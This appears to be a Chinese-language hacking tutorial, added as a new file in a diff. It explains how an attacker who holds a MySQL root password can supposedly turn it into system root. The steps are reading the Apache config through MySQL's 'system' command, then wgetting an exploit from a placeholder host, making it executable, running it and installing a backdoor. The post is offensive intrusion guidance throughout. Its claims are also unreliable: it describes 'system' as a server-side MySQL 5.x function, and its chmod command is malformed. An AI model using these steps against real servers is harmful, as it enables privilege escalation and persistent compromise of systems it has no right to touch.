@@ -1,0 +1,34 @@
+mysql5.x for linux下面有一个函数，
+
+这个函数4。x下面貌似没，
+
+mysql 5.x里面引入了一个system函数，这个函数可以执行系统命令，
+
+当mysql以root登陆的时候，就可以利用这个函数执行命令，当然是在权限许可的范围内。
+
+一般我们按照常规思路，搞到mysql的root密码之后，我们都会连接上去，
+
+创建一个表，然后outfile，搞到一个webshell ,然后提权如此这般。今天我们换一种方式。
+
+按照上面的方法，我们需要知道web的绝对路径，当然这个很不好找，有些有sqlinjection的，可能报错会显示出来，有的就不一定了。
+
+但是按照我的的方法，没有必要再去找web路径了，直接执行
+
+    mysql>system vi /etc/httpd/conf/httpd.conf;  
+     
+    mysql>system vi /etc/httpd/conf/httpd.conf;  
+
+直接这样就可以找到web的路径，当然，我们的目的并不是找web路径，放webshell进去。我们是要来做其他的事情，比如，下载exp执行，搞到root权限，然后装后门什么的
+
+
+    mysql>system wget http://xxxx.xxx.com/xxxx  
+     
+    mysql>system chmod x xxxx;  
+     
+    mysql>system ./xxxx;  
+     
+    
+
+　　这样mysql的root此时就成为system的root了，剩下的事情，假如开了ssh,就ssh上去，输入mysql的用户密码，ok,搞定。
+
+　　或者，直接提权之后，下载后门安装，这个就留给大家去研究了。
